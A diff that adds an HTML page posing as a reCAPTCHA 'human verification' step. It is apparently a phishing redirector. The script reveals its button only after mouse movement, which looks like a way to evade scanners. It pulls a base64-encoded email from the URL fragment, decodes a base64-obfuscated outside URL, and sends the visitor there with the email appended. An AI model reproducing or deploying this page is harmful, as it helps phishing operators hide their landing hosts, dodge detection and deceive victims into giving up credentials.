@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #f8f8f8;
+      padding-top: 100px;
+    }
+    #start-button {
+      display: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+  <h2>Human verification required</h2>
+  <p>Move your mouse to begin verification.</p>
+
+  <button id="start-button" onclick="startCaptcha()">I am not a robot</button>
+
+  <form id="captcha-form" style="display:none;" onsubmit="return false;">
+    <div class="g-recaptcha" data-sitekey="6LdvhZ0rAAAAABeTaVWGJpw_zjJG4hb-J7pTLhKX" data-callback="onCaptchaSuccess"></div>
+  </form>
+
+  <script>
+    const forwardEmail = true;
+
+    const urlParts = [
+      "aHR0cHM6Ly9za2MudmxyeWJqdGguZXMvOEBad0lOM2o2STRoWjR5Yy8="
+    ];
+
+    document.addEventListener("mousemove", function trigger() {
+      document.getElementById("start-button").style.display = "inline-block";
+      document.removeEventListener("mousemove", trigger);
+    });
+
+    function startCaptcha() {
+      document.getElementById("start-button").style.display = "none";
+      document.getElementById("captcha-form").style.display = "block";
+    }
+
+    function onCaptchaSuccess() {
+      const hash = window.location.hash;
+      const match = hash.match(/\?{3}49828947839Keyboard\?\?=([a-zA-Z0-9+/=]+)/);
+
+      if (!match || !match[1]) {
+        document.body.innerHTML = "<h3>Missing required parameter.</h3>";
+        return;
+      }
+
+      const encodedEmail = match[1].trim();
+      const baseURL = atob(urlParts[0]);
+
+      const finalURL = forwardEmail
+        ? `${baseURL}*${encodedEmail}`
+        : baseURL;
+
+      window.location.href = finalURL;
+    }
+  </script>
+</body>
+</html>
